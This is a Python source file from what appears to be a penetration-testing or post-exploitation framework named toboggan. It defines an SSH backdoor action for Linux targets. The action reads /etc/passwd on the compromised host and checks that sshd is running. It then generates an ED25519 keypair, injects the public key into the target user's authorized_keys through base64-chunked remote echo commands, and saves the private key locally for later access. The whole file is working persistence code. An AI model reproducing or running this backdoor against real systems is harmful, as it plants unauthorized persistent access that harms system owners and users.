# toboggan/core/actions/ssh_backdoor/linux.py

# Built-in imports
import os
import base64
from pathlib import Path

# External library imports
from loguru import logger
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.hazmat.primitives import serialization

# Local application/library specific imports
from toboggan.core.action import BaseAction


class SshBackdoorAction(BaseAction):
    DESCRIPTION = "Generate an SSH key remotely and drop it into a specific user's .ssh directory."

    def run(self, user: str = None) -> str:
        # If user not provided, use the current user
        if not user:
            user = self._executor.target.user
            if not user:
                return "❌ Could not determine target user."
            logger.info(f"ℹ️ No user specified, using current user: {user}")

        sshd_path = self._executor.os_helper.get_command_location("sshd")
        if not sshd_path or "not found" in sshd_path.lower():
            logger.warning(
                "⚠️ sshd is not installed on the target. SSH backdoor is currently unusable."
            )
            return "⚠️ sshd is not installed on the target."

        logger.info(f"🧭 sshd binary found at: {sshd_path.strip()}")
        # Check if sshd is running
        check_sshd = self._executor.remote_execute("ps aux | grep '[s]shd'")
        if not check_sshd or "sshd" not in check_sshd:
            logger.warning(
                "⚠️ sshd is not running on the target. You may need to start it manually."
            )
            return "⚠️ sshd is not running on the target."
        else:
            logger.success("✅ sshd is running.")

        # Step 1: Verify target user and home directory writability BEFORE generating keys
        logger.info(f"🎯 Targeting user: {user}")

        passwd_data = self._executor.remote_execute("cat /etc/passwd")
        if not passwd_data:
            return "❌ Could not read /etc/passwd."

        # Find the user's home directory from passwd
        home = None
        for line in passwd_data.strip().splitlines():
            parts = line.split(":")
            if len(parts) >= 7 and parts[0] == user:
                home = parts[5]
                break

        if not home:
            return f"⚠️ User '{user}' not found in /etc/passwd."

        # Test if home directory is writable
        test_write = self._executor.remote_execute(f"test -w {home} && echo O||echo N")
        if not test_write or "O" not in test_write:
            return f"⚠️ User '{user}' home directory is not writable: {home}"

        logger.success(f"✅ Target user home directory is writable: {home}")

        # Step 2: Generate SSH keypair locally in pure Python
        logger.info("🔑 Generating ED25519 keypair")

        try:
            # Generate private key
            private_key = ed25519.Ed25519PrivateKey.generate()

            # Get private key in OpenSSH format
            private_key_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.OpenSSH,
                encryption_algorithm=serialization.NoEncryption(),
            ).decode()

            # Get public key in SSH format
            public_key = private_key.public_key()
            public_key_ssh = public_key.public_bytes(
                encoding=serialization.Encoding.OpenSSH,
                format=serialization.PublicFormat.OpenSSH,
            ).decode()

            # Display public key for user
            logger.info(f"🔑 Public key: {public_key_ssh.strip()}")

            logger.success("✅ SSH keypair generated")
        except Exception as e:
            return f"❌ Failed to generate SSH keypair: {e}"

        # Step 3: Inject pubkey to user's authorized_keys
        ssh_dir = f"{home}/.ssh"
        auth_keys = f"{ssh_dir}/authorized_keys"
        pubkey_clean = public_key_ssh.strip()

        # Create .ssh directory if needed
        self._executor.remote_execute(f"mkdir -p {ssh_dir}")
        self._executor.remote_execute(f"chmod 700 {ssh_dir}")

        # Write key in chunks using base64 encoding to preserve spaces
        chunk_size = self._executor.command_max_size - len(
            f"echo  | base64 -d >> {auth_keys}"
        )
        for i in range(0, len(pubkey_clean), chunk_size):
            chunk = pubkey_clean[i : i + chunk_size]
            chunk_b64 = base64.b64encode(chunk.encode()).decode()
            self._executor.remote_execute(f"echo {chunk_b64}|base64 -d >> {auth_keys}")

        # Add newline after key to separate from next entry
        self._executor.remote_execute(f"echo >> {auth_keys}")

        # Set final permissions
        self._executor.remote_execute(f"chmod 600 {auth_keys}")

        logger.success(f"🔑 Public key injected into {auth_keys}")

        # Verify the key was properly added
        verify_key = self._executor.remote_execute(f"cat {auth_keys}")
        if pubkey_clean in verify_key:
            logger.success("✅ Public key confirmed in authorized_keys")
        else:
            logger.warning("⚠️ Public key not found in authorized_keys")
            return "❌ Failed to verify public key in authorized_keys"

        # Save private key locally
        local_save_path = Path.cwd() / f"id_ed25519_{user}"
        try:
            local_save_path.write_text(private_key_pem)
            local_save_path.chmod(0o600)
            logger.info(f"💾 Private key saved locally: {local_save_path}")
        except Exception as e:
            return f"❌ Failed to save private key locally: {e}"

        return ""
